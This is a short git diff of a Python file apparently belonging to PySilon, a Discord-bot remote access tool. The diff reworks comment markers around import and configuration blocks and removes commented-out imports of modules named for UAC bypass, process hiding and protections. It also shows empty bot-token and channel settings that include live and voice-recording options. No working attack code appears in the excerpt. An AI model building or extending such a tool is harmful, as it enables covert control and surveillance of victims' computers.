@@ -1,3 +1,4 @@
+#<imports>
 import os
 import sys
 import json
@@ -8,19 +9,17 @@ import subprocess
 from getpass import getuser
 from discord.ext import commands
 from urllib.request import urlopen
-#import resources.modules.uac_bypass as uac_bypass
-#import resources.modules.hide_process as proc_hider
-#import resources.modules.protections as pysilon_protections
+#</imports>
 
 # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
 # Don't edit anything in this file. Everything will be handled by compiler. #
 # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
 
-#begin_configuration
+#<configuration>
 bot_token = ''
 guild_ids = []
 channel_ids = {'main': True, 'spam': True, 'live': False, 'vrec': False}
-#end_configuration
+#</configuration>
 DEFAULT = 'DEFAULT'
 
 class PySilon(commands.Bot):
